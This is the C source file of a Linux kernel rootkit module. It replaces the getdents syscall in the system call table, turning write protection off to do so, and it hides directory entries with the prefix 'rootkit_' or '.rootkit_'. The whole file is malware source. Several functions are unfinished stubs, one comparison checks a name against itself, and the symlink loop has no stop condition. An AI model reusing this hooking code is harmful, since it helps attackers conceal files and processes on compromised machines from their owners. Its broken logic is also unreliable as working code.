/*
 * This file contains everything needed for the manipulated
 * getdents syscall.
 */
#include <asm/uaccess.h>
#include <linux/delay.h>
#include <linux/unistd.h>

#include "include.h"

/* pointers to some important kernel functions/resources */
asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*syscall_readlinkat) (int dirfd, const char *path, char *buf, size_t bufsiz);

/*
 * call counter to ensure that we are not unhooking the
 * getdents function while it is in use and the corresponding
 * spinlock
 */
static int getdents_call_counter = 0;
static spinlock_t *getdents_lock;
static unsigned long getdents_lock_flags;

/*
 * check if we need to hide this file because it matches
 * a path to be hidden. fd is the file descriptor for the
 * path we are currently in, *d_name is the name of the
 * file to check.
 */
int
hide_fpath(int fd, char *d_name)
{
	// TODO: loop the list of paths to hide
	if(strcmp(d_name, d_name) == 0)
	{
		
	}
	
	return 0;
}

/*
 * Check whether we need to hide this file because 
 * of its prefix
 */
int
hide_fprefix(char *d_name)
{
	// TODO: implement dynamic prefixes
	if(strstr(d_name, "rootkit_") == d_name) 
	{
		return 1;
	}
	else if(strstr(d_name, ".rootkit_") == d_name)
	{
		return 1;
	}

	return 0;
}

/* 
 * check if we need to hide a file because it is the process
 * id of a hidden process. fd must match the /proc/ folder.
 */
int
hide_process(int fd, char *d_name)
{	
	// TODO
	
	return 0;
}

int
hide_symlink(int fd, char *d_name)
{
	mm_segment_t old_fs;
	char lpath[128];
	size_t lpath_len;
	
	do {
		memset(lpath, 0, 128);	
	
		/* tell the kernel to ignore kernel-space memory in syscalls */
		old_fs = get_fs();
		set_fs(KERNEL_DS);
	
		/* execute our readlinkat syscall */
		lpath_len = (*syscall_readlinkat) (fd, d_name, lpath, 128);
	
		/* reset the kernel */	
		set_fs(old_fs);

		// TODO: insert stop condition
	
	} while (lpath_len > 0);

	return 0;
}

/* 
 * Checks whether a linux_dirent is a symbolic link and if it is
 * checks whether we need to hide it, too.
 */
int
check_symlink(char *path)
{
	char *ptr, *name;
	char delimiter = '/';
	
	ptr = strrchr(path, delimiter);
	name = ptr + 1;
	
	if(ptr == NULL)
	{
		return 0;
	}

	//return hide(name);
	return 0;
}

/*
 * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden.
 * If it matches then don't show, otherwise works normally and calls the original getdents.
 */
asmlinkage int
manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(getdents_call_counter, getdents_lock, getdents_lock_flags);
		
	long ret;
	int len = 0;
	int tlen = 0;

	ret = (*original_getdents) (fd,dirp,count);	
	tlen = ret;
		
	while(tlen>0)
	{
		len  = dirp->d_reclen;
		tlen = tlen-len;
		
//		/* Check if we need to hide this symlink (only if it is a symlink ofc) */
//		if(lpath_len > 0 && check_symlink(lpath))
//		{
//			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
//			ret -= len;
//		}	
		/* Check if we need to hide this file */
		if(hide_fpath(fd, dirp->d_name)
				|| hide_fprefix(dirp->d_name)
				|| hide_process(fd, dirp->d_name)
				|| hide_symlink(fd, dirp->d_name))
		{	
			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
			ret -= len;
		}
		else if(tlen != 0)
		{
			dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
		}

	}
	
	/* lock and decrease the call counter */
	DECREASE_CALL_COUNTER(getdents_call_counter, getdents_lock, getdents_lock_flags);

	return ret;
}

/*
 * hooks the system call 'getdents'
 */
void
hook_getdents(void) {
	void **sys_call_table = (void *) sysmap_sys_call_table;
	
	/* initialize our spinlock for the getdents counter */
	spin_lock_init(getdents_lock);

	/* get the 'readlinkat' syscall */
	syscall_readlinkat = (void*) sys_call_table[__NR_readlinkat];

	/* disable write protection */
	disable_page_protection();

	/* replace the syscall getdents */
	original_getdents = (void *) sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (int *) manipulated_getdents;

	/* reenable write protection */
	enable_page_protection();

	return;
}

/*
 * restores the original system call 'getdents'
 */
void
unhook_getdents(void) {
	void **sys_call_table = (void *) sysmap_sys_call_table;

	/* disable write protection */
	disable_page_protection();

	/* 
	 * make sure that all processes have left our manipulated syscall. 
	 * lock getdents_lock and keep it that way until we are done. 
	 */
	while(getdents_call_counter > 0) {
		msleep(10);
	}
	spin_lock_irqsave(getdents_lock, getdents_lock_flags);

	/* restore the old syscall */
	sys_call_table[__NR_getdents] = (int *) original_getdents;

	/* release our lock on getdents */
	spin_unlock_irqrestore(getdents_lock, getdents_lock_flags);
	
	/* reenable write protection */
	enable_page_protection();
}
